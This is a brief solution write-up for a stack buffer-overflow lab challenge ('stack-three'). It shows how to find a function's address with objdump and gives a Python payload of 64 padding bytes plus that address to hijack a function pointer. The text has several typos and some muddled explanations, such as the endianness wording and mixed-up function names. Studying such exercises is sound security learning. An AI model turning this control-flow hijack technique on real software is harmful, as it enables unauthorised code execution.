**Summery:**

this time, we won't be changing just variables, we'll change a pointer address
from its value to the value of `complete_challenge` function, the concept is
still similiar, you've to overflow the buffer and change the pointer value, much
more like an int. the pointer type is int, so it's still only 4 bytes in total!.


**Solution:**

We'll fill the buffer along with the offset of the complete_level function, so
that it gets executed, before that we have to get the offset of the function

```bash
$ objdump -M intel -d stack-three | grep complete_level
000000000040069d <complete_level>:
```
the offset is 0x40069d big endian or 0x9d0640 little endian, since our machine is little endian
then it we'll use it.

```python
#!/usr/bin/env python

from struct import pack
#print "A"*64 + "\x9d\x06\x40"' | ./stack-three

address = "\x9d\x06\x40"
#### BUF SECTION
buf = ""
buf += 'A' * 64
buf += address

print(buf)
```
**let's execute it**
```bash
~/solution-stack-three.py | ./stack-three
